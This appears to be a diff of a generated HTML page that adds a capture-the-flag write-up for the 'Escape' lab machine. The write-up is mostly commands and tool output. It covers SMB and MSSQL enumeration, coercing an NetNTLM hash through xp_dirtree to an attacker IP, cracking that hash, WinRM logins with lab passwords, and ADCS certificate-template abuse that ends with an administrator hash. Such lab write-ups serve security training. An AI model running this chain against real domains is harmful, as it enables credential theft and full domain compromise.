@@ -2048,6 +2048,51 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mssql-steal-netntlm-hash-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL steal NetNTLM hash / Relay attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql_svc" class="md-nav__link">
+    <span class="md-ellipsis">
+      sql_svc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ryancooper" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ryan.Cooper
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abuse-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abuse Template
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3298,6 +3343,51 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mssql-steal-netntlm-hash-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL steal NetNTLM hash / Relay attack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql_svc" class="md-nav__link">
+    <span class="md-ellipsis">
+      sql_svc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ryancooper" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ryan.Cooper
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#abuse-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      Abuse Template
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3316,8 +3406,207 @@
 <h1 id="escape">Escape</h1>
 <h2 id="port-scan">Port scan</h2>
 <pre><code class="language-bash">$ sudo nmap 10.10.11.202 -p- -T4 --min-rate=10000 -sCV
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-06 11:28:16Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2024-07-06T11:29:54+00:00; -16h00m07s from scanner time.
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.10.11.202:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-07-06T11:19:35
+|_Not valid after:  2054-07-06T11:19:35
+|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.
+| ms-sql-info: 
+|   10.10.11.202:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2024-07-06T11:29:53+00:00; -16h00m07s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-07-06T11:29:54+00:00; -16h00m07s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49703/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+53808/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+|_clock-skew: mean: -16h00m07s, deviation: 0s, median: -16h00m07s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-07-06T11:29:16
+|_  start_date: N/A
 </code></pre>
+<h2 id="smb">SMB</h2>
+<pre><code class="language-bash">$ smbclient -L //10.10.11.202/
+Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Public          Disk      
+        SYSVOL          Disk      Logon server share
+
+$ smbclient //10.10.11.202/Public
+smb: \&gt; get &quot;SQL Server Procedures.pdf&quot;
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image.png" /></p>
+<p><img alt="alt text" src="../assets/Escape/image1.png" /></p>
+<p><code>cmdkey /add:"&lt;serverName&gt;.sequel.htb" /user:"sequel\&lt;userame&gt;" /pass:&lt;password&gt;</code></p>
+<p><code>PublicUser:GuestUserCantWrite1</code></p>
+<h2 id="mssql-steal-netntlm-hash-relay-attack">MSSQL steal NetNTLM hash / Relay attack</h2>
+<p>Query SSL certs </p>
+<pre><code class="language-bash">$ openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image3.png" /></p>
+<pre><code class="language-bash">$ echo &quot;10.10.11.202 dc.sequel.htb sequel.htb dc&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<pre><code class="language-bash">$ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202 
+
+&gt; SELECT name, database_id, create_date  FROM sys.databases; 
+&gt; use msdb;
+
+&gt; SELECT name FROM sys.tables;
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image2.png" /></p>
+<pre><code class="language-bash"># Check if xp_cmdshell is enabled
+$ SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
+
+# This turns on advanced options and is needed to configure xp_cmdshell
+$ sp_configure 'show advanced options', '1'
+$ RECONFIGURE
+#This enables xp_cmdshell
+$ sp_configure 'xp_cmdshell', '1'
+$ RECONFIGURE
+
+$ EXEC master..xp_cmdshell 'whoami'
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image4.png" /></p>
+<p>Cannot run <code>xp_cmdshell</code> and don't have permission to reconfig it. But in HackTricks <code>Pentesting MSSQL - Microsoft SQL Server</code>, it mentions <code>xp_dirtree</code>.</p>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack">MSSQL Steal NetNTLM hash / Relay attack | HackTricks</a></p>
+<pre><code class="language-bash">Use master;
+EXEC sp_helprotect 'xp_dirtree';
+EXEC sp_helprotect 'xp_subdirs';
+EXEC sp_helprotect 'xp_fileexist';
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image5.png" /></p>
+<pre><code class="language-bash">xp_dirtree '\\10.10.16.2\any\thing';
+exec master.dbo.xp_dirtree '\\10.10.16.2\any\thing';
+
+$ sudo responder -I tun0 
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+REGGIE1234ronnie (sql_svc) 
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image6.png" /></p>
+<p><img alt="alt text" src="../assets/Escape/image7.png" /></p>
+<h2 id="sql_svc">sql_svc</h2>
+<pre><code class="language-bash">$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+
+$ Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
+
+# C:\sqlserver\logs\ERRORLOG.BAK
+
+&gt; type ERRORLOG.BAK
+
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</code></pre>
+<p>Watch out the times of these error events. These three error messages almost happened at the same time. It might be a typo.</p>
+<h2 id="ryancooper">Ryan.Cooper</h2>
+<pre><code class="language-bash">$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
+</code></pre>
+<p><strong>Identify ADCS</strong></p>
+<p>One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using crackmapexec (and it works as either sql_svc or Ryan.Cooper):</p>
+<pre><code class="language-bash">$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
+
+ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
+ADCS                                                Found CN: sequel-DC-CA
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image8.png" /></p>
+<pre><code class="language-bash">&gt; upload ../Tools/Certify.exe Certify.exe
+&gt; .\Certify.exe find /vulnerable
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image9.png" /></p>
+<p>The danger here is that <code>sequel\Domain Users</code> has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).</p>
+<h2 id="abuse-template">Abuse Template</h2>
+<p><strong>With Certify / Rubeus</strong></p>
+<pre><code class="language-bash">$ .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image10.png" /></p>
+<p>Copy the text from <code>-----BEGIN RSA PRIVATE KEY-----</code> to <code>-----END CERTIFICATE-----</code> into a file called <code>cert.pem</code> and covert it to <code>pfx</code> without password.</p>
+<pre><code class="language-bash">$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+</code></pre>
+<pre><code class="language-bash">&gt; .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+
+&gt; .\Rubeus.exe asktgt /user:administrator /certificate:C:\users\ryan.cooper\cert.pfx /getcredentials /show /nowrap
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image11.png" /></p>
+<p>NTLM: A52F78E4C751E5F5E17E1E9F3E58F4EE</p>
+<p><img alt="alt text" src="../assets/Escape/image12.png" /></p>
+<p><strong>With Certipy on Kali</strong></p>
+<p><a href="https://github.com/ly4k/Certipy">ly4k/Certipy</a></p>
+<pre><code class="language-bash">$ certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image13.png" /></p>
+<pre><code class="language-bash">$ certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image14.png" /></p>
+<pre><code class="language-bash">$ certipy-ad auth -pfx administrator.pfx
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image15.png" /></p>
+<p>I can sync the clock with Escape using <code>ntpdate</code>:</p>
+<pre><code class="language-bash">$ sudo ntpdate -u sequel.htb
+</code></pre>
+<p><img alt="alt text" src="../assets/Escape/image16.png" /></p>
 
 
 
@@ -3338,7 +3627,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">July 7, 2024</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">July 12, 2024</span>
   </span>
 
     
